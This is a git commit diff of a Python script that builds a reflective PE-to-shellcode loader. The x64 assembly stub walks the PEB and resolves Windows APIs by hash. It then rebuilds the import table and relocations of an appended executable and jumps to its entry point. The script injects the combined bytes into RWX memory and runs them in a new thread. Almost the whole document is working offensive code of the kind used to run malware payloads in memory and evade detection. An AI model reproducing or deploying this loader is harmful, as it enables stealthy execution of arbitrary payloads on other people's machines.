72206a27dff3a3be718d7cc088faf04c312df9d4
senzee <33692631+senzee1984@users.noreply.github.com>
2024-01-08 20:11:11 -0500

    Update PrependedShellcodeStub.py

--- PrependedShellcodeStub.py
+++ PrependedShellcodeStub.py
@@ -1,230 +1,277 @@
 import ctypes, struct
-import argparse
 from keystone import *
 
-'''
-e_lfanew:		DWORD 0x3c
-BaseReloc		QWORD [0x3C]+0xb0
-ImportDir		WORD [0x3c]+0x90
-ImportDirSize		WORD [0x3c]+0x94
-EntryPoint:		DWORD [0x3c]+0x28
-PreferredAddress:	QWORD [0x3c]+0x30
-
-isDll:			WORD [0x3c]+0x16
-IAT			QWORD [0x3c]+0xe8
-ExportDir		QWORD [0x3c]+0x88	
 
 
-ntheader
-sectortable		
-tlsdir			QWORD [0x3c]+0xd0
-exceptiondir		QWORD [0x3c]+0xa0
-resourcedir		QWORD [0x3c]+0x98
-
-
-Entry in ImportDir: 0-3 ILT_RVA  12-15 ModName_RVA 16-19 IAT_RVA
-Entry in ILT: (1000000000000000 + FuncOrd) | HintName_RVA
-HintName: IndexOfENPT+FuncName
-Process: 
-1: Access ILT, get HintName_RVA
-2: Access HintNameTable, get ENPT Index
-3: Get 2nd Index in OT, which is FuncOrd
-4: Get func_rva in EAT
-
-OR
-1: Access ILT, get FuncOrd
-2: Get func_rva in EAT
- 
-
-
-FixIAT()
-{
-DWORD ImportDir_RVA = PE[PE[0x3c]+0x90]	// ImportDirRVA = e_lfanew + 0x90
-QWORD ImportDir = Base + PE[PE[0x3c] + 0x90]	//The first Import Descriptor entry = VA of Import Directory
-DWORD ImportDir_Size = PE[PE[0x3c]+0x94]
-for(i = ImportDir; i < ImportDir + ImportDir_Size; i = i + 0x14)	//Each entry(dll) is 0x14 bytes
-{
-	DWORD ILT_RVA = PE[i]	//ILT RVA is the 1st DWORD
-	QWORD ILT = Base + PE[i]
-	DWORD IAT_RVA = PE[i + 0x10]	// IAT RVA is the 5th DWORD
-	QWORD IAT = Base + PE[i + 0x10]
-	DWORD Module_Name_RVA = PE[i + 0xc]	// Module Name string RVA is the 4th DWORD
-	String Module_Name = Base + PE[i + 0xc]
-	QWORD module_addr = LoadLibraryA(Module_Name)
-	processedbytes = 0
-	while(True)
-	{
-		ILT_THUNK = ILT + processedbytes
-		IAT_THUNK = IAT + processedbytes
-		if (IAT_THUNK == 0 && ILT_THUNK ==0)	//The elements in ILT and IAT are both empty
-		{
-			break
-		}	
-		
-		if(ILT_THUNK >= 1000000000000000)	//The highest bit is 1, import by ord
-		{
-			Func_Addr = GetProcAddress(module_addr, (ILT_THUNK-1000000000000000))
-			
-		}
-		else
-		{
-			Func_Name = PE[ILT_THUNK] + 2
-			Func_Addr = GetProcAddress(module_addr, Func_Name)
-			
-		}
-		PEP[IAT_THUNK] = Func_Addr
-		processedbytes += 0x10
-				
-	}
-	
-}
-}
-
-
-BaseReloc Table: Multiple blocks
-Number of entries in the block: (Size-0x8)/0x2
-Each block: 0-3 Page_RVA, 4-7 Size, 8-Size-1 WORD * Count
-In each word: 0-3 bit Type. 4-15 Offset from page
-Hardcoded_Address_RVA: PE[Page_RVA  + Offset_from_page]
-Hardcoded_Address: 
-
-Fix_Reloc()
-{
-	DWORD BaseReloc_RVA = PE[PE[0x3c]+0xb0]	// BaseReloc_RVA = e_lfanew + 0xb0
-	QWORD BaseReloc = Base + PE[PE[0x3c] + 0xb0]	//BaseReloc VA
-	DWORD BaseReloc_Size = PE[PE[0x3c] + 0xb4]	
-	QWORD Delta = Base - PE[PE[0x3c] + 0x30]	//Delta of the base address
-
-	PE[PE[0x3c]+ 0x30] = Base	//Update image base
-
-	DWORD Block_RVA =  PE[BaseReloc]	//The first block page RVA
-	DWORD Block_Size = PE[BaseReloc + 4]	//The first block's size
-
-	for(i = BaseReloc; i < BaseReloc + BaseReloc_Size; i += Block_Size )	//Iterate all blocks
-	{
-		Block_RVA =  PE[i]
-		Block_Size = PE[i + 4]
-		for(j=i+8; j < i + Block_Size; j +=2 )	//Iterate all entries in current block	
-		{
-			WORD value = PE[j]		//Value in current entry
-			if(value > 0)	//The latest one could be 0
-			{
-				12Bits offset = value[0]	//Offset from page
-				4Bits type = value[12]		//Type
-				DWORD Reloc_RVA = Block_RVA + offset	//Corresponding RVA of the hardcoded address
-				PE[Base + Reloc_RVA] = PE[Base + Reloc_RVA] + Delta	//Patch the hardcoded address, typically		
-			}
-		}				
-	}
-}
-
-
-
-"get_pe_addr:"
-" lea rbx, [rip+0x100];"	# Assume the shellcode stub is 0x100 bytes ahead of PE payload
-
-"iat_init:"
-" mov eax, [rbx+0x3c];"		# eax contains e_lfanew
-" mov r11, [eax+0x90];"		# r11 contains ImportDir RVA
-" add r11, rbx;"		# r11 points to ImportDir
-" mov r12, [eax+0x94];"		# r12 contains ImportDir Size
-" mov rcx, r11;"		# rcx acts as an index, start from ImportDir
-" mov rdx, r11;"
-" add rdx, r12;"		# rdx is the upper bond of ImportDir
-
-"import_descriptor_loop:"
-
-
-"import_descriptor_entry_loop:"
-
-
-
-"basereloc_init:"
-" mov r14, [eax+0xb0];"		# r14 contains BaseRelocDir RVA
-" add r14, rbx;"		# r14 points to BaseRelocDir
-
-
-
-'''
-
-	CODE = (
+CODE = (
 "find_kernel32:"
+" sub rsp, 0x8;"
 " xor rdx, rdx;"
-" mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
-" mov rsi,[rax+0x18];"        # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
-" mov rsi,[rsi + 0x30];"        # RSI is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
-" mov r9, [rsi];"        # Current module is python.exe
-" mov r9, [r9];"        # Current module is ntdll.dll
-" mov r9, [r9+0x10];"        # Current module is kernel32.dll
-" jmp jump_section;"
+" mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
+" mov rsi,[rax+0x18];"			# RSI = Address of _PEB_LDR_DATA
+" mov rsi,[rsi + 0x30];"		# RSI = Address of the InInitializationOrderModuleList
+" mov r9, [rsi];"			# python.exe
+" mov r9, [r9];"			# ntdll.dll
+" mov r9, [r9+0x10];"			# kernel32.dll
+" jmp function_stub;"			# Jump to func call stub
 
-"parse_module:"        # Parsing DLL file in memory
-" mov ecx, dword ptr [r9 + 0x3c];"        # R9 stores the base address of the module, get the NT header offset
+"parse_module:"				# Parsing DLL file in memory
+" mov ecx, dword ptr [r9 + 0x3c];"	# R9 = Base address of the module, ECX = NT header offset
 " xor r15, r15;"
-" mov r15b, 0x88;"	# Offset to Export Directory   
-" add r15, r9;"
-" add r15, rcx;"
-" mov r15d, dword ptr [r15];"        # Get the RVA of the export directory
-" add r15, r9;"        # R14 stores  the VMA of the export directory
-" mov ecx, dword ptr [r15 + 0x18];"        # ECX stores the number of function names as an index value
-" mov r14d, dword ptr [r15 + 0x20];"        # Get the RVA of ENPT
-" add r14, r9;"        # R14 stores  the VMA of ENPT
+" mov r15b, 0x88;"			# Offset to Export Directory   
+" add r15, r9;"				
+" add r15, rcx;"			# R15 points to Export Directory
+" mov r15d, dword ptr [r15];"		# R15 = RVA of export directory
+" add r15, r9;"				# R15 = VA of export directory
+" mov ecx, dword ptr [r15 + 0x18];"	# ECX = # of function names as an index value
+" mov r14d, dword ptr [r15 + 0x20];"	# R14 = RVA of ENPT
+" add r14, r9;"				# R14 = VA of ENPT
 
-"search_function:"        # Search for a given function
-" jrcxz not_found;"        # If RCX is 0, the given function is not found
-" dec ecx;"        # Decrease index by 1
+"search_function:"			# Search for a given function
+" jrcxz not_found;"			# If RCX = 0, the given function is not found
+" dec ecx;"				# Decrease index by 1
 " xor rsi, rsi;"
-" mov esi, [r14 + rcx*4];"        # RVA of function name string
-" add rsi, r9;"        # RSI points to function name string
+" mov esi, [r14 + rcx*4];"		# RVA of function name
+" add rsi, r9;"				# RSI points to function name string
 
-"function_hashing:"        # Hash function name function
+"function_hashing:"			# Hash function name function
 " xor rax, rax;"
 " xor rdx, rdx;"
-" cld;"        # Clear DF flag
+" cld;"					# Clear DF flag
 
-"iteration:"        # Iterate over each byte
-" lodsb;"        # Copy the next byte of RSI to Al
-" test al, al;"        # If reaching the end of the string
-" jz compare_hash;"        # Compare hash
-" ror edx, 0x0d;"        # Part of hash algorithm
-" add edx, eax;"        # Part of hash algorithm
-" jmp iteration;"        # Next byte
+"iteration:"				# Iterate over each byte
+" lodsb;"				# Copy the next byte of RSI to Al
+" test al, al;"				# If reaching the end of the string
+" jz compare_hash;"			# Compare hash
+" ror edx, 0x0d;"			# Part of hash algorithm
+" add edx, eax;"			# Part of hash algorithm
+" jmp iteration;"			# Next byte
 
-"compare_hash:"        # Compare hash
-" cmp edx, r8d;"
-" jnz search_function;"        # If not equal, search the previous function (index decreases)
-" mov r10d, [r15 + 0x24];"        # Ordinal table RVA
-" add r10, r9;"        # Ordinal table VMA
-" movzx ecx, word ptr [r10 + 2*rcx];"        # Ordinal value -1
-" mov r11d, [r15 + 0x1c];"        # RVA of EAT
-" add r11, r9;"        # VMA of EAT
-" mov eax, [r11 + 4*rcx];"        # RAX stores RVA of the function
-" add rax, r9;"        # RAX stores  VMA of the function
+"compare_hash:"				# Compare hash
+" cmp edx, r8d;"			# R8 = Supplied function hash
+" jnz search_function;"			# If not equal, search the previous function (index decreases)
+" mov r10d, [r15 + 0x24];"		# Ordinal table RVA
+" add r10, r9;"				# R10 = Ordinal table VMA
+" movzx ecx, word ptr [r10 + 2*rcx];"	# Ordinal value -1
+" mov r11d, [r15 + 0x1c];"		# RVA of EAT
+" add r11, r9;"				# r11 = VA of EAT
+" mov eax, [r11 + 4*rcx];"		# RAX = RVA of the function
+" add rax, r9;"				# RAX = VA of the function
 " ret;"
 "not_found:"
+" xor rax, rax;"			# Return zero
 " ret;"
 
-"jump_section:"        # Achieve PIC and elminiate 0x00 byte
-" mov rbp, r9;"        # RBP stores base address of Kernel32.dll
-" mov r8d, 0xec0e4e8e;"        # LoadLibraryA Hash
-" call parse_module;"        # Search LoadLibraryA's address
-" mov r12, rax;"        # R12 stores the address of LoadLibraryA function
+"function_stub:"			# Achieve PIC and elminiate 0x00 byte
+" mov rbp, r9;"				# RBP stores base address of Kernel32.dll
+" mov r8d, 0xec0e4e8e;"			# LoadLibraryA Hash
+" call parse_module;"			# Search LoadLibraryA's address
+" mov r12, rax;"			# R12 stores the address of LoadLibraryA function
+" mov r8d, 0x7c0dfcaa;"			# GetProcAddress Hash
+" call parse_module;"			# Search GetProcAddress's address
+" mov r13, rax;"			# R13 stores the address of GetProcAddress function
 
-"load_module:"
+
+"fix_iat:"  				# Init necessary variable for fixing IAT
+" xor rsi, rsi;"
+" xor rdi, rdi;"
+" lea rbx, [rip+0x15e];"		# RBX points to PE part of shellcode, now 346 bytes in total
+" nop;"
 " xor rax, rax;"
-" mov ax, 0x6c6c;"        # Save the string "ll" to RAX
-" push rax;"        # Push the string to the stack
-" mov rax, 0x642E32335F325357;"        # Save the string "WS2_32.D" to RAX
-" push rax;"        # Push the string to the stack
-" mov rcx, rsp;"        # RCX points to the "WS2_32.dll" string
-" sub rsp, 0x20;"        # Function prologue
-" mov rax, r12;"        # RAX stores address of LoadLibraryA function
-" call rax;"        # LoadLibraryA("ws2_32.dll")
-" add rsp, 0x20;"        # Function epilogue
-" mov r14, rax;"        # R14 stores the base address of ws2_32.dll
+" mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
+" add rax, rbx;"          		# RAX points to NT Header
+" mov esi, [rax+0x90];"  		# ESI = ImportDir RVA
+" add rsi, rbx;"         		# RSI points to ImportDir
+" mov edi, [rax+0x94];"   		# EDI = ImportDir Size
+" add rdi, rsi;"          		# RDI = ImportDir VA + Size
+
+
+"loop_imported_module:"
+" cmp rsi, rdi;"          		# Compare current descriptor with the end of import directory
+" je module_loop_end;"    		# If equal, exit the loop
+" xor rdx ,rdx;"
+" mov edx, [rsi];"        		# EDX = ILT RVA (32-bit)
+" test rdx, rdx;"         		# Check if ILT RVA is zero (end of descriptors)
+" je module_loop_end;"    		# If zero, exit the loop
+" xor rcx, rcx;"
+" mov ecx, [rsi+0xc];"    		# RCX = Module Name RVA
+" add rcx, rbx;"          		# RCX points to Module Name
+" call r12;"              		# Call LoadLibraryA
+" xor rdx ,rdx;"			
+" mov edx, [rsi];"        		# Restore ILT RVA
+" add rdx, rbx;"          		# RDX points to ILT
+" xor r8, r8;"				
+" mov r8d, [rsi+0x10];"   		# R8 = IAT RVA	
+" add r8, rbx;"           		# R8 points to IAT
+" mov rcx, rax;"          		# Module handle for GetProcAddress
+" mov r14, rdx;"			# Backup ILT Address
+" mov r15, r8;"				# Backup IAT Address
+
+"loop_imported_func:"
+" mov rdx, r14;"			# Restore ILT address + processed entries
+" mov r8, r15;"				# Restore IAT Address + processed entries
+" mov rdx, [rdx];"        		# RDX = Ordinal or RVA of HintName Table
+" test rdx, rdx;"         		# Check if it's the end of the ILT/IAT
+" je next_descriptor;"    		# If zero, move to the next descriptor
+" mov r9, 0x8000000000000000;"
+" test rdx, r9;"  			# Check if it is import by ordinal (highest bit set)
+" mov rbp, rcx;"			# Save module base address
+" jnz resolve_by_ordinal;"		# If set, resolve by ordinal
+
+"resolve_by_name:"
+" add rdx, rbx;"          		# RDX = HintName Table VA
+" add rdx, 2;"		  		# RDX points to Function Name
+" call r13;"              		# Call GetProcAddress
+" jmp update_iat;"        		# Go to update IAT
+
+"resolve_by_ordinal:"
+" mov r9, 0x7fffffffffffffff;"
+" and rdx, r9;"			   	# RDX = Ordinal number
+" call r13;"              		# Call GetProcAddress with ordinal
+
+"update_iat:"
+" mov rcx, rbp;"          		# Restore module base address
+" mov r8, r15;"				# Restore IAT Address + processed entries
+" mov [r8], rax;"         		# Write the resolved address to the IAT
+" add r15, 0x8;"             		# Move to the next IAT entry (64-bit addresses)
+" add r14, 0x8;"		  	# Movce to the next ILT entry
+" jmp loop_imported_func;"		# Repeat for the next function
+
+"next_descriptor:"
+" add rsi, 0x14;"         		# Move to next import descriptor
+" jmp loop_imported_module;"  		# Continue loop
+
+"module_loop_end:"
+
+"fix_reloc:"				# Save RBX //dq rbx+21b0 l46
+" xor rsi, rsi;"
+" xor rdi, rdi;"
+" xor rax, rax;"
+" xor r8, r8;"				# Empty R8 to save page RVA
+" xor r9, r9;"				# Empty R9 to place block size
+" xor r15, r15;"
+" mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
+" add rax, rbx;"          		# RAX points to NT Header
+" mov esi, [rax+0xb0];"  		# ESI = BaseReloc RVA
+" add rsi, rbx;"         		# RSI points to BaseReloc
+" mov edi, [rax+0xb4];"   		# EDI = BaseReloc Size
+" add rdi, rsi;"          		# RDI = BaseReloc VA + Size
+" mov r15d, [rax+0x28];"		# R15 = Entry point RVA
+" add r15, rbx;"			# R15 = Entry point
+" mov r14, [rax+0x30];"			# R14 = Preferred address
+" sub r14, rbx;"			# R14 = Delta address 
+" mov [rax+0x30], rbx;"			# Update Image Base Address
+" mov r8d, [rsi];"			# R8 = First block page RVA
+" add r8, rbx;"				# R8 points to first block page (Should add an offset later)
+" mov r9d, [rsi+4];"			# First block's size
+" xor rax, rax;"
+" xor rcx, rcx;"
+
+"loop_reloc_block:"
+" cmp rsi, rdi;"          		# Compare current block with the end of BaseReloc
+" je reloc_fixed_end;"    		# If equal, exit the loop
+" xor r8, r8;"
+" mov r8d, [rsi];"			# R8 = Current block's page RVA
+" add r8, rbx;"				# R8 points to current block page (Should add an offset later)
+" mov r11, r8;"				# Backup R8
+" xor r9, r9;"
+" mov r9d, [rsi+4];"			# R9 = Current block size
+" add rsi, 8;"				# RSI points to the 1st entry, index for inner loop for all entries
+" mov rdx, rsi;"
+" add rdx, r9;"
+" sub rdx, 8;"				# RDX = End of all entries in current block
+
+"loop_reloc_entries:"
+" cmp rsi, rdx;"			# If we reached the end of current block
+" jz next_block;"			# Move to next block
+" xor rax, rax;"
+" mov ax, [rsi];"			# RAX = Current entry value
+" test rax, rax;"			# If entry value is 0
+" jz next_block;"			# Reach the end of entry
+" mov r10, rax;"			# Copy entry value to R10
+" and eax, 0xfff;"			# Offset, 12 bits
+" shr r10d, 12;"			# Type value, 4 bits
+" add r8, rax;"				# Added an offset
+
+
+
+"update_entry:"
+" sub [r8], r14;"			# Update the address
+#" int3;"
+" mov r8, r11;"				# Restore r8
+" add rsi, 2;"				# Move to next entry by adding 2 bytes
+" jmp loop_reloc_entries;"
+
+"next_block:"
+" jmp loop_reloc_block;"
+
+"reloc_fixed_end:"
+" nop;"
+" sub rsp,8;"                   		# 
+" nop;"
+" nop;"
+" nop;"
+" nop;"
+" nop;"
+" nop;"
+" nop;"
+" nop;"
+" nop;"
+" jmp r15;"
 )
-	ks = Ks(KS_ARCH_X86, KS_MODE_64)
-	encoding, count = ks.asm(CODE)
 
 
+def read_pe_file(file_path):
+    with open(file_path, 'rb') as file:
+        return bytearray(file.read())
 
+def print_byte_array(byte_array, line_length=20, max_lines=30):
+    for i in range(min(max_lines, len(byte_array) // line_length)):
+        line = byte_array[i * line_length:(i + 1) * line_length]
+        formatted_line = ''.join([f"\\x{b:02x}" for b in line])
+        print(f"buf += b\"{formatted_line}\"")
+    print("......"+str(len(byte_array)-600) +" more bytes......")
+
+pe_file_path = 'dumped.bin'
+pe_array = read_pe_file(pe_file_path)
+
+
+ks = Ks(KS_ARCH_X86, KS_MODE_64)
+encoding, count = ks.asm(CODE)
+#print("%d instructions..." % count)
+
+sh = b""
+for e in encoding:
+    sh += struct.pack("B", e)
+shellcode = bytearray(sh)
+print("Shellcode Stub size: "+str(len(shellcode))+" bytes")
+shellcode = shellcode + pe_array
+print("Shellcoded PE's size: "+str(len(shellcode))+" bytes")
+sc = ""
+#print("Payload size: "+str(len(encoding))+" bytes")
+
+
+print_byte_array(shellcode)
+
+
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
+                                     buf,
+                                     ctypes.c_int(len(shellcode)))
+print("Shellcode located at address %s" % hex(ptr))
+input("...ENTER TO EXECUTE SHELLCODE...")
+
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.c_uint64(ptr),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.pointer(ctypes.c_int(0)))
+
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
